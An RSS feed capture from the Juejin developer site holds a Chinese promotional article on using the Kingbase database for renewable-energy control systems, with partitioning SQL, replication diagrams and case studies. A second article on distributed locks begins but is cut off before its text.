<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[从海量时序数据到无人值守：数据库在新能源集控系统中的架构实践]]></title>    <link>https://juejin.cn/post/7575442779038761002</link>    <guid>https://juejin.cn/post/7575442779038761002</guid>    <pubDate>2025-11-23T08:22:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575442779038761002" data-draft-id="7575442779038744618" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="从海量时序数据到无人值守：数据库在新能源集控系统中的架构实践"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2025-11-23T08:22:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="倔强的石头_"/> <meta itemprop="url" content="https://juejin.cn/user/3168119757484368"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            从海量时序数据到无人值守：数据库在新能源集控系统中的架构实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3168119757484368/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    倔强的石头_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:22:35.000Z" title="Sun Nov 23 2025 08:22:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b59e5aa258b845fc8c7f38558707f456~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490954&amp;x-signature=EjncswH7gCo%2BAzdkVNhJOGIhN3Y%3D" alt="640.gif" loading="lazy"/></p>
<p>@[toc]</p>
<h2 data-id="heading-0">引言</h2>
<p>谈到“双碳”与能源革命，风电，光伏这些新能源产业显然是当下最为炙手可热的风口，若想在该赛道跑得更远，更快，数字化和智能化转型并非可选，而是必备功课，要知道，从远程操控成千上万台风电机组，到及时分析大量的设备数据，直至把整个生产运维流程管理得井井有条，哪一步能离开稳定，高效且安全的数据“大后方”呢？</p>
<p>于是，一些问题便随之出现，新能源相关业务对于数据库的要求非常高，其一，物联网设备每日所生成的时序数据量犹如天文数字，其二，生产经营体系要承受高并发访问的压力，那些位于四面八方场站还要执行好容灾备份工作，这就像要求一名后卫不但要速度快而且体格健硕，关键时候也不能出现纰漏。</p>
<p>在此种大背景之下，我们高兴地发现，国产数据库正依靠自身的技术实力与服务，渐渐化为新能源行业数字化转型的中坚力量，金仓数据库（Kingbase）便是其中不可忽略的一个存在，其犹如一位身怀绝技的“扫地僧”，凭借在高性能，高可靠性，高安全性以及智能运作维护方面所积淀的深厚功底，给众多新能源企业的关键系统给予了稳固有力的支持，很好地解决了许多令人头疼的问题。</p>
<hr/>
<h2 data-id="heading-1">关于金仓数据库</h2>
<p>那么，这个金仓数据库到底是什么来头？</p>
<p>简单来说，Kingbase是电科金仓（北京）科技股份有限公司的当家产品。这家公司来头不小，不但是国内最早一批做自主数据库的厂商，还是中国电子科技集团（CETC）的“国家队”成员。他们的目标很明确，就是要做顶尖的企业级数据库产品。</p>
<p>其旗舰产品金仓数据库管理系统KingbaseES（简称KES），就是一款专为事务密集、高并发、高可用的复杂场景打造的企业级关系型数据库。它有几手“独门绝技”：
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fa25b64f0e334c88b3e0d54130d4d5a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490954&amp;x-signature=aLBSol7mNTMuluaP9OmhvBlgun4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/755f78bc8e8549ada0abdf17cd814a3e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490954&amp;x-signature=LOv6GV1IzvMLOXea9rlSF5A8KQs%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>
<p><strong>卓越性能与自治调优</strong>：听起来很专业，其实可以理解为KingbaseES的内核里藏着一个“调优机器人”。它能自己诊断、自己优化，把以前需要数据库专家熬夜干的活儿，变成了数据库自己的日常工作。这样一来，就算面对几千人同时操作的极端情况，系统也能反应飞快。</p>
</li>
<li>
<p><strong>金融级高可用保障</strong>：新能源业务可是一天24小时、一年365天都不能停的。为了确保万无一失，KingbaseES拿出了一套金融级别的“不死鸟”方案。它支持“一主多备”的集群模式，主服务器的数据能实时同步到备用服务器上，万一主服务器“罢工”，备用服务器能秒级顶上，数据一个都不会丢。它甚至还能搞定跨越上千公里的异地容灾，真正做到高枕无忧。</p>
</li>
<li>
<p><strong>全方位数据安全</strong>：数据安全是命脉。KingbaseES就像给数据穿上了一层层“金钟罩铁布衫”，从访问控制、数据加密到安全审计，防护措施一应俱全，达到了国家信息系统安全等级保护的四级要求。把核心生产数据交给它，心里踏实。</p>
</li>
<li>
<p><strong>高度兼容与平滑迁移</strong>：很多企业最头疼的就是换系统，怕原来的应用跑不起来。KingbaseES早就想到了这一点，它对Oracle的语法兼容性做得非常好，还配了个叫KDTS的“搬家神器”。这个工具能把原来跑在MySQL、PostgreSQL甚至MongoDB上的数据和应用，以极低的成本、甚至“零代码修改”的代价，快速迁移过来，让国产化替代不再是件愁人的事。</p>
</li>
</ul>
<p>正是靠着这些硬核实力，金仓数据库才成了众多关键行业核心系统的放心之选。</p>
<hr/>
<h2 data-id="heading-2">金仓数据库在新能源行业的技术解读</h2>
<p>咱们再往深了聊聊，金仓数据库在新能源行业里，到底是怎么“秀肌肉”的。</p>
<p>一般来说，新能源的数字化系统，比如集控中心、运维平台，有四个“老大难”问题：时序数据多到爆炸、高并发访问压力山大、业务一秒都不能停、老旧系统五花八门。面对这些，KingbaseES见招拆招，用自己的一套组合拳给出了漂亮的答案。</p>
<h3 data-id="heading-3">1. 应对海量时序数据：分区存储与高效查询</h3>
<p><strong>业务挑战</strong>：风机、光伏板这些设备，个个都是数据“生产大户”，每时每刻都在往外蹦各种工况数据。这些数据是宝贝，是设备监控、故障预警的基础。但数据量实在太大了，怎么存、怎么查，才能又快又好，是个大难题。</p>
<p><strong>金仓解决方案</strong>：KingbaseES用了一个聪明的办法——<strong>表分区</strong>。它把一张巨大的数据表，按时间（比如按天或按月）切成一小块一小块。这样做的好处显而易见：</p>
<ul>
<li><strong>写入查询都飞快</strong>：新数据只往最新的那一小块里写，互不干扰。查询的时候，只要告诉它时间范围，它就能精准地找到对应的那几块数据，不用再大海捞针一样地全表扫描。</li>
<li><strong>管理数据超轻松</strong>：过期的历史数据想删掉？简单！以前用<code>DELETE</code>得删半天，还留下一堆“垃圾”。现在直接把对应的旧分区整个端掉就行，秒速完成，干净利落。</li>
</ul>
<p><strong>代码示例：创建按月分区的设备数据表</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建一个按月分区的设备数据主表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> device_metrics (
    device_id   <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    metric_time <span class="hljs-type">TIMESTAMP</span>   <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    metric_name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>),
    <span class="hljs-keyword">value</span>       <span class="hljs-type">NUMERIC</span>(<span class="hljs-number">18</span>, <span class="hljs-number">6</span>)
) <span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">RANGE</span> (metric_time);

<span class="hljs-comment">-- 为2025年11月和12月创建分区</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> device_metrics_202511 <span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">OF</span> device_metrics
    <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">VALUES</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-string">'2025-11-01'</span>) <span class="hljs-keyword">TO</span> (<span class="hljs-string">'2025-12-01'</span>);

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> device_metrics_202512 <span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">OF</span> device_metrics
    <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">VALUES</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-string">'2025-12-01'</span>) <span class="hljs-keyword">TO</span> (<span class="hljs-string">'2026-01-01'</span>);

<span class="hljs-comment">-- 当查询特定时间范围的数据时，优化器会自动选择对应的分区</span>
<span class="hljs-comment">-- 例如，此查询将仅扫描 device_metrics_202511 分区</span>
<span class="hljs-keyword">SELECT</span> device_id, <span class="hljs-keyword">value</span>
<span class="hljs-keyword">FROM</span> device_metrics
<span class="hljs-keyword">WHERE</span> metric_time <span class="hljs-operator">&gt;=</span> <span class="hljs-string">'2025-11-10'</span> <span class="hljs-keyword">AND</span> metric_time <span class="hljs-operator">&lt;</span> <span class="hljs-string">'2025-11-11'</span>;
</code></pre>
<h3 data-id="heading-4">2. 支撑高并发访问：读写分离与自治调优</h3>
<p><strong>业务挑战</strong>：一个生产运维系统，可能同时有几千号人在线操作，有查报表的，有开工单的，有做检修的。这么多请求一股脑儿地涌过来，数据库要是扛不住，整个系统就得卡顿甚至瘫痪。</p>
<p><strong>金仓解决方案</strong>：KingbaseES有两大法宝来应对：<strong>读写分离集群</strong>和<strong>内核自治调优</strong>。</p>
<ul>
<li>
<p><strong>读写分离集群架构</strong>：这个战术很简单，就是“分工合作”。搞一个“一主多备”的集群，主节点是“总指挥”，专门处理“写”这种关键操作。其他几个备节点当“参谋”，从主节点那儿同步数据，然后专门负责“读”这种查询、看报表的工作。这样一来，就把压力分散出去了，大家都能轻松上阵。</p>
<pre><code class="hljs language-scss" lang="scss">+----------------+      /---&gt; <span class="hljs-selector-attr">[备节点1 (只读)]</span>
|   应用服务     |     /
| (读写请求)     |---&gt; <span class="hljs-selector-attr">[主节点 (读写)]</span> ---&gt; <span class="hljs-selector-attr">[备节点2 (只读)]</span>
+----------------+     \
                        \---&gt; <span class="hljs-selector-attr">[备节点3 (只读)]</span>
                                 |
                                 V
                            <span class="hljs-selector-attr">[物理日志流同步]</span>
</code></pre>
</li>
<li>
<p><strong>自治调优能力</strong>：这就是前面提到的“调优机器人”。它能自动优化SQL，还能根据历史经验“学习”进化，让执行计划越来越聪明。甚至在你写的SQL性能不佳时，它还会主动给你提建议，比如“这里该建个索引了”，大大减轻了数据库管理员的负担。</p>
</li>
</ul>
<h3 data-id="heading-5">3. 保障业务连续性：跨地域高可用与容灾</h3>
<p><strong>业务挑战</strong>：核心生产系统，就跟人的心脏一样，一秒钟都不能停。不仅要防止本地出故障，还得能扛得住地震、断电这种区域性的天灾人祸。</p>
<p><strong>金仓解决方案</strong>：KingbaseES提供的是一套经过实战检验的“两地三中心”或“异地双中心”高可用方案。</p>
<ul>
<li>
<p><strong>在生产中心</strong>：部署一个“一主两备”的本地高可用集群。主备之间的数据实时同步。万一主节点“牺牲”，系统几秒内就能自动把备用节点扶正，业务几乎感觉不到中断，数据也零丢失。</p>
</li>
<li>
<p><strong>在异地灾备中心</strong>：在几百甚至上千公里外的另一个城市，再部署一个灾备节点。生产中心的数据会准实时地复制过去。这样，就算整个生产中心都“沦陷”了，还能从容地把业务切换到灾备中心，保住最后的火种。</p>
<pre><code class="hljs language-scss" lang="scss">+---------------------------+      <span class="hljs-selector-attr">[广域网 (WAN)]</span>      +---------------------------+
|      生产中心 (城市A)     |                          |      灾备中心 (城市B)     |
|                           |                          |                           |
|  <span class="hljs-selector-attr">[主]</span> ---&gt; <span class="hljs-selector-attr">[备1]</span> ---&gt; <span class="hljs-selector-attr">[备2]</span> | <span class="hljs-built_in">--</span>(异步物理日志复制)--&gt; |           <span class="hljs-selector-attr">[备3]</span>           |
|  (同步/异步物理日志复制)  |                          |                           |
+---------------------------+                          +---------------------------+
</code></pre>
</li>
</ul>
<h3 data-id="heading-6">4. 实现平滑迁移：高度兼容与自动化工具</h3>
<p><strong>业务挑战</strong>：很多新能源企业一路发展过来，系统里用了MySQL、Oracle、PostgreSQL等各种数据库，五花八门，形成了“数据孤岛”。现在想建一个统一的平台，把这些老系统里的宝贝数据和应用都搬过来，简直是浩大又头疼的工程。</p>
<p><strong>金仓解决方案</strong>：KingbaseES在设计之初就想到了这一点。</p>
<ul>
<li>
<p><strong>它高度兼容Oracle</strong>：从语法、数据类型到存储过程，都跟Oracle很像。这意味着，原来给Oracle写的应用，基本上不用怎么改，甚至不用改，就能直接在KingbaseES上跑起来。</p>
</li>
<li>
<p><strong>它有自动化“搬家”工具KDTS</strong>：这个工具非常强大，能自动搞定数据结构映射、数据迁移、数据校验这些繁琐的活儿。原来可能要花几个星期才能干完的迁移工作，现在几天甚至更短时间就能搞定，风险和成本都大大降低。</p>
</li>
</ul>
<hr/>
<h2 data-id="heading-7">案例分析：金仓数据库赋能新能源智慧运维</h2>
<p>“光说不练假把式”。理论说了这么多，我们来看看金仓数据库在真实战场上的表现到底怎么样。其实，它早就在国家能源集团、中国广核集团、国家电力投资集团等多个大型能源企业的核心系统中“身经百战”了。下面这几个案例，就很有代表性。</p>
<h3 data-id="heading-8">案例一：中广核新能源生产运维系统——应对“整合、高并发、高可用”三大挑战</h3>
<ul>
<li>
<p><strong>业务背景</strong>：中广核的新能源业务摊子铺得很大，风、光、水多点开花，管着600多个场站。但以前的生产系统都是各搞各的，技术五花八门，数据不通，管理起来很费劲。所以，他们下决心要搞一个统一的生产运维系统。</p>
</li>
<li>
<p><strong>核心挑战</strong>：</p>
<ol>
<li><strong>系统整合难</strong>：要把原来基于MySQL、PostgreSQL、MongoDB等各种数据库的应用和数据都统一起来，这活儿想想就头大。</li>
<li><strong>并发访问高</strong>：新系统上线，得撑住6000多号员工同时在线操作，还要求反应速度要快。</li>
<li><strong>可用性要求极致</strong>：这可是核心生产系统，必须做到金融级的99.999%可用性，还得能跨上千公里搞异地容灾。</li>
</ol>
</li>
<li>
<p><strong>金仓解决方案与成效</strong>：</p>
<ul>
<li><strong>平滑迁移，零代码修改</strong>：金仓的团队带着“搬家神器”KDTS一进场，很快就把各个“山头”的数据和应用都收编了过来，软件开发商的应用甚至做到了“零代码修改”，一下子就让大家悬着的心放下了。</li>
<li><strong>自治调优，性能卓越</strong>：面对6000人并发的压力测试，KingbaseES的“调优机器人”大显身手，只花了3天就完成了性能优化，让系统在高压下也能秒级响应。</li>
<li><strong>异地双中心，稳定可靠</strong>：通过部署“生产中心+灾备中心”的架构，KingbaseES给系统上了双保险，确保了7x24小时的稳定运行。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e691206c448246ff96d772447f3d78d7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490954&amp;x-signature=%2FDpJ%2F8Q9yE1Ic0S9%2B1z26PEB0xM%3D" alt="image.png" loading="lazy"/></li>
</ul>
</li>
</ul>
<h3 data-id="heading-9">案例二：国家能源集团龙源电力——186个新能源场站集控系统国产化替代</h3>
<ul>
<li>
<p><strong>业务背景</strong>：龙源电力是全球最大的风电运营商，他们要在全国27个省区的186个场站搞一套新的集控系统，把数据都统一管起来。</p>
</li>
<li>
<p><strong>核心挑战</strong>：</p>
<ol>
<li><strong>部署范围广</strong>：项目遍布大江南北，对部署、运维和本地化服务的响应能力是个巨大考验。</li>
<li><strong>核心系统可靠性</strong>：场站的集控核心系统绝对不能出问题，原来用的Oracle虽然稳，但维保成本高，还有“卡脖子”的风险。</li>
<li><strong>数据安全</strong>：这些可都是核心生产数据，安全等级要求非常高。</li>
</ol>
</li>
<li>
<p><strong>金仓解决方案与成效</strong>：</p>
<ul>
<li><strong>主备高可用，保障业务连续</strong>：每个场站都用KingbaseES搞了“双机主备”架构，成功换掉了Oracle，既保证了业务不中断，也做好了数据备份。</li>
<li><strong>高度兼容Oracle，快速迁移</strong>：因为KingbaseES和Oracle很“像”，整个替换过程非常顺滑，应用基本没怎么改。</li>
<li><strong>全国服务网络，本地化支持</strong>：金仓遍布全国的服务网络发挥了巨大作用，为27个省区的项目提供了7x24小时的本地支持，确保了项目顺利落地。</li>
<li><strong>安全合规</strong>：KingbaseES自带的各种安全功能，完全满足国家对核心数据安全的要求，让人放心。</li>
</ul>
</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a5ff48045c54bd981adffc1e19a548d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764490954&amp;x-signature=TVeoY%2Bwwk64gHOKu8IGRBTTgL5E%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-10">案例三：国家电投集团甘肃新能源——“无人值守”风电场集控系统</h3>
<ul>
<li>
<p><strong>业务背景</strong>：为了在偏远地区实现风电场“无人值班、少人值守”的智慧运维，国家电投甘肃新能源公司需要一套高度自动化的集控系统。</p>
</li>
<li>
<p><strong>核心挑战</strong>：</p>
<ul>
<li><strong>数据一致性</strong>：“无人值守”模式下，数据绝对不能出错，否则一个错误的指令就可能造成巨大损失。</li>
<li><strong>业务连续性</strong>：自动化调度系统必须像永动机一样不停运转。</li>
</ul>
</li>
<li>
<p><strong>金仓解决方案与成效</strong>：</p>
<ul>
<li><strong>高可用架构，替代Oracle</strong>：同样，KingbaseES的高可用方案成功替代了Oracle，既保证了系统冗余，也确保了数据安全可靠。</li>
<li><strong>原厂本地化服务</strong>：金仓的运维团队提供了“秒级响应”的本地服务，成了系统稳定运行的坚实后盾，也为后续更大范围的国产化铺平了道路。</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-11">结语</h2>
<p>写到最后，就会察觉，在形成新型电力系统这一时代洪流当中，数字化和智能化是极为关键的“船”与“桨”。</p>
<p>回顾金仓数据库的技术要点及其在新能源领域的实际应用情况，不论是解决复杂的异构数据迁移问题，承受大量的并发访问压力，还是保障“无人值守”风电场的稳定运行，该数据库均表现出色，这表明其作为国产数据库的领先者，具备成为新能源行业核心业务稳固根基的能力与实力。</p>
<p>未来的新能源世界必定会愈加重视数据，金仓数据库这般既精通技术又了解行业的人才将会一直发挥关键作用，凭借其稳定，可靠且高效的数据能力不断给中国新能源事业增添活力。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[大场面试之最终一致性与分布式锁]]></title>    <link>https://juejin.cn/post/7575655132748300324</link>    <guid>https://juejin.cn/post/7575655132748300324</guid>    <pubDate>2025-11-23T08:23:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575655132748300324" data-draft-id="7575442779038777386" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="大场面试之最终一致性与分布式锁"/> <meta itemprop="keywords" content="后端,面试,架构"/> <meta itemprop="datePublished" content="2025-11-23T08:23:56.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="360_go_php"/> <meta itemprop="url" content="https://juejin.cn/user/2436173498956695"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            大场面试之最终一致性与分布式锁
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2436173498956695/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    360_go_php
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:23:56.000Z" title="Sun Nov 23 2025 08:23:56 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body 